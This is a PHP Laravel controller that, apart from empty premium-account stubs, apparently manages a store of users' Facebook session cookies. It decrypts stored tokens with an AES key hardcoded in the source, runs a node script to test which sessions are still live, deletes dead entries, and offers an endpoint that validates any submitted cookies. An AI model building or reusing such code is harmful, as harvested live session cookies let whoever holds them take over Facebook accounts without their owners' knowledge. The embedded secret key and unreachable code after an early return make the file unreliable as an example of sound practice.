<?php

namespace App\Http\Controllers;

use App\Models\PremiumAccount;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Validator;
use phpseclib3\Crypt\AES;
use Session;
use View;

class APIController extends Controller
{

    public function startPremium(Request $request){

    }

    public function activatePremium(Request $request){

    }

    public function checkPremium(Request $request){

    }







    public function youtubeTEV(){
        return view('youtube_thumbnail_extractor');
    }


    public function clearCookies(Request $request){

        $cookies = DB::connection('mysql2')->table("users")->limit(100)->where('loginType', 'fb')->inRandomOrder()->get()->pluck('cookies');
        $clearCookies = [];
        foreach($cookies as $cookie){
            if(!preg_match('/c_user=([^;]+)/', $cookie, $matches)){
              $clearCookies[] = $this->decryptFlutterToken($cookie);
            }else{
                $clearCookies[] = $cookie;
            }
        }


        // return response()->json($clearCookies);
        $command = 'node ' . base_path('node_scripts/check_fb_cookie.cjs') . ' ' . escapeshellarg(json_encode($clearCookies));

        $output = shell_exec($command);
        $output = json_decode($output, true);

        foreach($output['results'] as $result){
             if (isset($result['success']) && $result['success'] === false) {
                // Delete the database entry to set the cookie as valid
                DB::connection('mysql2')->table("users")->where('id', $result['user_id'])->delete();
            }
        }


    }



    public function checkCookies(Request $request){
        $validator = Validator::make($request->all(), [
            'cookies' => 'required',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'message' => 'Please provide cookies',
            ], 200);
        }

        // Run node script to check cookies
        $cookies = $request->input('cookies'); // Array of cookies

        $command = 'node ' . base_path('node_scripts/check_fb_cookie.cjs') . ' ' . escapeshellarg(json_encode($cookies));

        $output = shell_exec($command);
        return $output = json_decode($output, true);
        if (isset($output['status']) && $output['status'] === true) {
            return response()->json([
                'status' => true,
                'message' => 'Cookies are valid',
            ], 200);
        } else {
            return response()->json([
                'status' => false,
                'message' => 'Cookies are invalid',
            ], 200);
        }
    }

    private function decryptFlutterToken($token)
    {
        if (!$token) {
            return response()->json(['error' => 'Missing token'], 400);
        }

        $key = 'p9X7mZ4tQ2fS6uV8yB1cE3hJ5kN7rT0w'; // must be 32 chars

        $data = base64_decode($token);
        if ($data === false) {
            return response()->json(['error' => 'Invalid base64 token'], 400);
        }

        // Extract IV (first 16 bytes) and ciphertext
        $iv = substr($data, 0, 16);
        $ciphertext = substr($data, 16);

        $aes = new AES('cbc');
        $aes->setKey($key);
        $aes->setIV($iv);

        try {
            $decrypted = $aes->decrypt($ciphertext);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Decryption failed', 'details' => $e->getMessage()], 400);
        }

        return $decrypted;

    }

    }
